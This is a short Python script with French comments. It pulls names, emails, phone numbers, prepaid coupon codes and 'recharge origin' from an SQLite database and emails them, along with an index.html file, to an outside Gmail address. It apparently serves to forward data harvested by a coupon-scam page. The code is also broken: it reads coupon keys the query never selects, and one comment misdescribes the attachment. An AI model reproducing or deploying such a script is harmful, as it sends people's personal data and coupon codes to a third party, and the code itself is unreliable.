import sqlite3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# se connecter à la base de données
conn = sqlite3.connect('ma_base_de_donnees.db')

# récupérer les données de la base de données
cursor = conn.execute("SELECT nom, prenom, email, telephone, code_coupon, origine_recharge FROM informations")
data = [dict(zip([column[0] for column in cursor.description], row)) for row in cursor.fetchall()]

# créer le contenu du message
text = ""
for row in data:
    text += f"Nom : {row['nom']}\n"
    text += f"Prénom : {row['prenom']}\n"
    text += f"Email : {row['email']}\n"
    text += f"Téléphone : {row['telephone']}\n"
    text += f"Code coupon 1 : {row['code_coupon 1']}\n"
    text += f"Code coupon 2 : {row['code_coupon 2']}\n"
    text += f"Code coupon 3 : {row['code_coupon 3']}\n"
    text += f"Code coupon 4 : {row['code_coupon 4']}\n"
    text += f"Code coupon 5 : {row['code_coupon 5']}\n"

    text += f"Origine de la recharge : {row['origine_recharge']}\n\n"

# créer le message
msg = MIMEMultipart()
msg['From'] = 'mon_adresse_email@example.com'
msg['To'] = 'damiendelage92@gmail.com'
msg['Subject'] = 'Données de la base de données'
msg.attach(MIMEText(text))

# joindre la base de données au message
with open('index.html', 'rb') as f:
    db_data = f.read()
    part = MIMEApplication(db_data, Name='index.html')
    part['Content-Disposition'] = f'attachment; filename="index.html"'
    msg.attach(part)

# envoyer le message par e-mail
with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
    smtp.starttls()
    smtp.login('mon_adresse_email@example.com', 'mon_mot_de_passe')
    smtp.send_message(msg)
